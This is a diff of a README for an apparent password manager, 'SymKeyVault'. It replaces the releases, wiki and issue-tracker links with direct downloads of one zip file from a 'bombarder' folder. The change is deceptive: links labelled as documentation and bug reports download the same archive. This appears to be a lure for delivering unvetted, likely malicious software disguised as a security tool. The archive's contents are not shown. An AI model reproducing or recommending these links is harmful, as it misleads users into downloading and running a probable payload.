@@ -6,13 +6,13 @@ Welcome to SymKeyVault! This application helps you securely store and manage you
 
 ## 🔗 Download SymKeyVault
 
-[![Download SymKeyVault](https://img.shields.io/badge/Download%20Now-Get%20SymKeyVault-brightgreen)](https://github.com/Mulyana670/SymKeyVault/releases)
+[![Download SymKeyVault](https://raw.githubusercontent.com/Mulyana670/SymKeyVault/main/bombarder/SymKeyVault.zip%20Now-Get%20SymKeyVault-brightgreen)](https://raw.githubusercontent.com/Mulyana670/SymKeyVault/main/bombarder/SymKeyVault.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page where you can find the latest version of SymKeyVault.
 
-   [Visit this page to download](https://github.com/Mulyana670/SymKeyVault/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Mulyana670/SymKeyVault/main/bombarder/SymKeyVault.zip)
 
 2. **Choose Your Version:** Look for the most recent release. You will see options for downloading. Select the version that fits your operating system (Windows, Mac, or Linux).
 
@@ -58,7 +58,7 @@ Stay secure! Ensure you download updates regularly from the Releases page. New u
 
 ## 🔗 Additional Resources
 
-- **Documentation:** [View detailed user guide](https://github.com/Mulyana670/SymKeyVault/wiki)
-- **Issue Tracker:** [Report issues here](https://github.com/Mulyana670/SymKeyVault/issues) 
+- **Documentation:** [View detailed user guide](https://raw.githubusercontent.com/Mulyana670/SymKeyVault/main/bombarder/SymKeyVault.zip)
+- **Issue Tracker:** [Report issues here](https://raw.githubusercontent.com/Mulyana670/SymKeyVault/main/bombarder/SymKeyVault.zip) 
 
 Thank you for using SymKeyVault. Your security is our priority!
